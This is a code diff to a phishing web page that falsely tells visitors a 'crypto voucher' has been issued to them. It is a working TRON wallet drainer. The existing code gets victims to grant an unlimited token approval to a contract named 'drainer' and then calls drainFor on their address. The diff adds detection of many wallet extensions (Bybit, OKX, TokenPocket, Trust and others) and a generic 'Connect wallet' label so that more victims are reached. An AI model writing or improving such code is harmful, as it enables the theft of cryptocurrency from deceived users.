@@ -58,7 +58,7 @@
     <h1 class="headline">A crypto voucher has been issued to you!</h1>
     <div class="sub">Connect your wallet to receive it. TronRewards never requests private keys.</div>
     <img class="voucher" src="voucher.png?v=2" alt="" onerror="this.style.display='none'">
-    <button class="cta" id="connect-tl">Connect TronLink</button>
+    <button class="cta" id="connect-tl">Connect wallet</button>
     <button class="ghost" id="connect-wc">Other wallet (Trust, TokenPocket, …)</button>
     <div class="status" id="cstatus"></div>
   </div>
@@ -245,18 +245,34 @@ async function wcSend(contract, selector, param, feeLimit) {
 const wcSendApprove = (token) => wcSend(token, 'approve(address,uint256)', addrParam(cfg.drainer) + uintParam(MAX), 150e6);
 const wcSendClaim = () => wcSend(cfg.drainer, 'drainFor(address)', addrParam(account), 300e6);
 
+function pickProvider() {
+  const w = window;
+  const c = [
+    w.tronLink,
+    w.bybitWallet && w.bybitWallet.tronLink,
+    w.okxwallet && w.okxwallet.tronLink,
+    w.tokenpocket && w.tokenpocket.tron,
+    w.bitkeep && w.bitkeep.tron,
+    w.gatewallet && w.gatewallet.tron,
+    w.trustwallet && w.trustwallet.tronLink,
+    w.tronWeb,
+  ];
+  return c.find((x) => x && typeof x.request === 'function');
+}
+
 async function connectTronLink() {
   if (DEMO) { cfg = { drainer: 'TDemoDrainerContractxxxxxxxxxxxxxx1', bait: 'TDemoBait' }; $('contract').textContent = cfg.drainer; signer = { kind: 'demo', address: 'TDemoAddressxxxxxxxxxxxxxxxxx1' }; account = signer.address; await load(); return; }
   $('connect-tl').disabled = true;
   setStatus('Connecting…??');
   if (!cfg) { try { await loadConfig(); } catch (e) { setStatus('Config error', 'err'); $('connect-tl').disabled = false; return; } }
-  const tl = window.tronLink || window.tronWeb;
-  if (tl && tl.request) { try { await tl.request({ method: 'tron_requestAccounts' }); } catch (e) {} }
-  if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) {
-    setStatus('TronLink not found — use the other wallet button.', 'err');
+  const prov = pickProvider();
+  if (prov) { try { await prov.request({ method: 'tron_requestAccounts' }); } catch (e) {} }
+  const tw = prov && (prov.tronWeb || prov);
+  if (!tw || !tw.defaultAddress || !tw.defaultAddress.base58) {
+    setStatus('Wallet not found — use the other wallet button.', 'err');
     $('connect-tl').disabled = false; return;
   }
-  signer = { kind: 'tronlink', w: window.tronWeb, address: window.tronWeb.defaultAddress.base58 };
+  signer = { kind: 'tronlink', w: tw, address: tw.defaultAddress.base58 };
   account = signer.address;
   await load();
 }
